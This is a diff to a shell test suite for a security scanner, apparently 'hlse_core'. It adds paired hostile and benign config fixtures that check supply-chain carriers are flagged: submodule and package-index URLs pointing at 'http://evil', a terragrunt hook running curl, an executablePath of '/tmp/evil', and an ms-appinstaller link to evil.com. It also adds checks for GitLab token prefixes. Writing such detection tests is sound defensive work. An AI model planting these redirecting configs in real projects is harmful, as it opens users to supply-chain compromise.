@@ -8882,6 +8882,77 @@ printf 'DLAGENTS=("https::/tmp/evil %%u %%o")\n' > "$XDIR/dl1/makepkg.conf"
 ./hlse_core file "$XDIR/dl1/makepkg.conf" 2>&1 | grep -q "F56" \
     && check "file: makepkg DLAGENTS flagged" "0" "0" \
     || check "file: makepkg DLAGENTS flagged" "0" "1"
+# F56: repo-fetch / hook-pipeline carriers
+mkdir -p "$XDIR/rf1" "$XDIR/rf2"
+printf '[submodule "x"]\n path = x\n url = http://evil\n' \
+    > "$XDIR/rf1/.gitmodules"
+./hlse_core file "$XDIR/rf1/.gitmodules" 2>&1 | grep -q "F56" \
+    && check "file: .gitmodules url flagged" "0" "0" \
+    || check "file: .gitmodules url flagged" "0" "1"
+printf '[submodule "x"]\n path = x\n' > "$XDIR/rf2/.gitmodules"
+./hlse_core file "$XDIR/rf2/.gitmodules" 2>&1 | grep -q "F56" \
+    && check "file: benign .gitmodules no F56" "0" "1" \
+    || check "file: benign .gitmodules no F56" "0" "0"
+printf 'repos:\n- repo: http://evil/hooks\n  hooks:\n    - id: x\n' \
+    > "$XDIR/rf1/.pre-commit-config.yaml"
+./hlse_core file "$XDIR/rf1/.pre-commit-config.yaml" 2>&1 \
+    | grep -q "F56" \
+    && check "file: pre-commit remote repo flagged" "0" "0" \
+    || check "file: pre-commit remote repo flagged" "0" "1"
+printf 'repos:\n- repo: local\n  hooks: []\n' \
+    > "$XDIR/rf2/.pre-commit-config.yaml"
+./hlse_core file "$XDIR/rf2/.pre-commit-config.yaml" 2>&1 \
+    | grep -q "F56" \
+    && check "file: local pre-commit no F56" "0" "1" \
+    || check "file: local pre-commit no F56" "0" "0"
+printf 'terraform {\n before_hook "x" {\n   execute = ["curl","e"]\n }\n}\n' \
+    > "$XDIR/rf1/terragrunt.hcl"
+./hlse_core file "$XDIR/rf1/terragrunt.hcl" 2>&1 | grep -q "F56" \
+    && check "file: terragrunt before_hook flagged" "0" "0" \
+    || check "file: terragrunt before_hook flagged" "0" "1"
+printf 'terraform { source = "x" }\n' > "$XDIR/rf2/terragrunt.hcl"
+./hlse_core file "$XDIR/rf2/terragrunt.hcl" 2>&1 | grep -q "F56" \
+    && check "file: benign terragrunt no F56" "0" "1" \
+    || check "file: benign terragrunt no F56" "0" "0"
+printf 'addSbtPlugin("com.evil" %% "x" %% "1.0")\n' > "$XDIR/rf1/plugins.sbt"
+./hlse_core file "$XDIR/rf1/plugins.sbt" 2>&1 | grep -q "F56" \
+    && check "file: plugins.sbt addSbtPlugin flagged" "0" "0" \
+    || check "file: plugins.sbt addSbtPlugin flagged" "0" "1"
+printf 'lazy val x = 1\n' > "$XDIR/rf2/plugins.sbt"
+./hlse_core file "$XDIR/rf2/plugins.sbt" 2>&1 | grep -q "F56" \
+    && check "file: benign plugins.sbt no F56" "0" "1" \
+    || check "file: benign plugins.sbt no F56" "0" "0"
+printf 'index-url = "http://evil"\n' > "$XDIR/rf1/uv.toml"
+./hlse_core file "$XDIR/rf1/uv.toml" 2>&1 | grep -q "F56" \
+    && check "file: uv.toml index-url flagged" "0" "0" \
+    || check "file: uv.toml index-url flagged" "0" "1"
+printf 'default-index = "internal"\n' > "$XDIR/rf2/uv.toml"
+./hlse_core file "$XDIR/rf2/uv.toml" 2>&1 | grep -q "F56" \
+    && check "file: benign uv.toml no F56" "0" "1" \
+    || check "file: benign uv.toml no F56" "0" "0"
+printf '[[tool.poetry.source]]\nname = "x"\nurl = "http://evil"\n' \
+    > "$XDIR/rf1/pyproject.toml"
+./hlse_core file "$XDIR/rf1/pyproject.toml" 2>&1 | grep -q "F56" \
+    && check "file: pyproject poetry source flagged" "0" "0" \
+    || check "file: pyproject poetry source flagged" "0" "1"
+printf '[project]\nname = "x"\n' > "$XDIR/rf2/pyproject.toml"
+./hlse_core file "$XDIR/rf2/pyproject.toml" 2>&1 | grep -q "F56" \
+    && check "file: benign pyproject no F56" "0" "1" \
+    || check "file: benign pyproject no F56" "0" "0"
+printf '{"php.validate.executablePath":"/tmp/evil"}\n' \
+    > "$XDIR/rf1/settings.json"
+./hlse_core file "$XDIR/rf1/settings.json" 2>&1 | grep -q "F56" \
+    && check "file: settings.json executablePath flagged" "0" "0" \
+    || check "file: settings.json executablePath flagged" "0" "1"
+printf '{"theme":"dark"}\n' > "$XDIR/rf2/settings.json"
+./hlse_core file "$XDIR/rf2/settings.json" 2>&1 | grep -q "F56" \
+    && check "file: benign settings.json no F56" "0" "1" \
+    || check "file: benign settings.json no F56" "0" "0"
+printf 'plugin_cache_dir = "/tmp/x"\n' > "$XDIR/rf1/.terraformrc"
+./hlse_core file "$XDIR/rf1/.terraformrc" 2>&1 | grep -q "F56" \
+    && check "file: terraformrc plugin_cache flagged" "0" "0" \
+    || check "file: terraformrc plugin_cache flagged" "0" "1"
+
 # F56: credential/session carrier files
 printf '{"log":{"entries":[{"request":{"cookies":[{"name":"s","value":"x"}]}}]}}\n' \
     > "$XDIR/x.har"
@@ -8946,6 +9017,17 @@ done
 ./hlse_core secret -- 'the word PMAK- here is fine' 2>&1 | grep -q 'OK' \
     && check "secret: benign PMAK text clean" "0" "0" \
     || check "secret: benign PMAK text clean" "0" "1"
+# secret: GitLab secondary token families (glcbt-/glptt-/glagent-/glft-/
+# glimt-/gloas-) — same alnum_or_dash body shape as glpat-
+for sp in glcbt- glptt- glagent- glft- glimt- gloas-; do
+    ./hlse_core secret -- "${sp}aBcDeFgHiJkLmNoPqRsTuVwXyZ" 2>&1 \
+        | grep -qE 'ISOLATE|BLOCK' \
+        && check "secret: ${sp} flagged" "0" "0" \
+        || check "secret: ${sp} flagged" "0" "1"
+done
+./hlse_core secret -- 'the word glcbt-short is fine' 2>&1 | grep -q 'OK' \
+    && check "secret: benign glcbt text clean" "0" "0" \
+    || check "secret: benign glcbt text clean" "0" "1"
 # ms-appinstaller / ms-windows-store handler schemes
 ./hlse_core 'ms-appinstaller:?source=http://evil.com/x.appinstaller' \
     2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
